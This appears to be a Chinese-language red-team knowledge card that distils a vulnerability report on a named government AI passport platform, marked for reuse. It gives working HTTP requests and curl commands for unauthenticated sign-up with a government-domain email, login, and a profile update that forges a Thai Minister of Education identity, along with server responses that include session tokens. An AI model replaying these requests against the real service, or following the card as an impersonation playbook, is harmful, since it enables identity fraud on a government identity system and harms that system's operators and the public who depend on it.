# 漏洞批量导出对话报告

- Source report: `vulnerability-report-conversation-20260901-013932.md`
- Full report: `domains/recon/case-reports/vuln-batch-export-20260901/vulnerability-report-conversation-20260901-013932.md`
- Techniques: auth
- Fused: 2026-09-17

## Key findings (distilled)

- 漏洞总数: 3
- 漏洞ID: `ab2145c4-c874-4443-ae02-ba181167a4e4`
- 严重程度: high
- 与未认证注册漏洞叠加，形成"0认证 → 政府官员身份"完整攻击链
- 漏洞ID: `1658c487-5790-4d67-ae7c-be72f3b40d13`
- 严重程度: high
- 平台作为政府 AI 护照系统，未认证注册严重违反安全基线
- 漏洞ID: `ceee155d-7ab4-4ae7-8f7f-8accf86cdaee`

## Repro snippets

```
## 步骤1: 用政府域名注册
POST https://de.aipass.net/api/v1/auth/sign-up/email
{"email":"minister<rand>@moe.go.th","password":"RedTeam123!","name":"Fake Minister"}
→ 200 注册成功（政府域名邮箱不受任何限制）

## 步骤2: 登录
POST https://de.aipass.net/api/v1/auth/sign-in/email（form: email+password）
→ 200 有效会话 cookie

## 步骤3: 伪造政府官员档案
POST https://api.aipass.net/api/v1/auth/update-user
{"department":"กระทรวงศึกษาธิการ (MOE)","position":"รัฐมนตรีว่าการกระทรวงศึกษาธิการ (Minister of Education)","occupation":"Government Official","c
## 注册请求
POST https://de.aipass.net/api/v1/auth/sign-up/email
Content-Type: application/json
{"email":"redb854bd45@proton.me","password":"RedTeam123!","name":"RedTeam"}

## 注册响应 (200)
{"token":"DTPcF9Ik9PMacB9cMLaglPItJx42RvWy","user":{"id":"2161851090534134680480753342178212269","email":"redb854bd45@proton.me","emailVerified":false,"name":"RedTeam","role":"user","banned":false,"kycVerified":false,"citizenIdHash":null,"citizenIdVerified":false,"ialLevel":1,"phoneNumber":null,"phoneNumberVerified"
注册（未认证）：
curl -X POST 'https://de.aipass.net/api/v1/auth/sign-up/email' -H 'Content-Type: application/json' -H 'User-Agent: Mozilla/5.0' --data '{"email":"redb854bd45@proton.me","password":"RedTeam123!","name":"RedTeam Tester"}'
→ HTTP 200 {"token":"VZFONJFNmvXWyOvTMLrUmP8RS8fVWXfx","user":{"name":"RedTeam Tester","email":"redb854bd45@proton.me","emailVerified":false,"role":"user","banned":false,"kycVerified":false,"id":"2161851090534134680480753342178212269","createdAt":"2026-09-01T05:41:49.3
```

## When to reuse

- 同类标签命中：auth
- 先读本卡片，再打开 Full report 复现细节

@TGSEC社区 · @TGSEC-Qtzuu 整理
